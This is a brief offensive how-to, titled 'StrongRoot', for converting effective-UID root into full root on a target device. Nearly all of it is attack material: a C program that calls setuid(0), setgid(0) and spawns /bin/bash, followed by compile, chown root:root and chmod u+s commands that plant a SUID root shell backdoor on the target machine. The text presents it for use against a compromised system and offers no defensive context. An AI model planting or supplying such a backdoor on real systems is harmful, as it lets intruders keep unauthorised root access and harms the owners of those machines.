StrongRoot

Converts Effective euid root to Full root

Requirements:

We have euid root on a device

Process;

1. Create the following simple but powerful C program:

#include<unistd.h>

int main()

{

setuid(0);

setgid(0);

system("/bin/bash");

}

2. Compile it and SETUID bit on it to be run by root.

gcc root_exploit.c -o root_exploit -w [-w: for supress warnings]

Note: The following has to be done on the target machine. (Compilation can be done anywhere)

chown root:root root_exploit

chmod u+s root_exploit

Once we run this, we will get a bash shell with full root access.
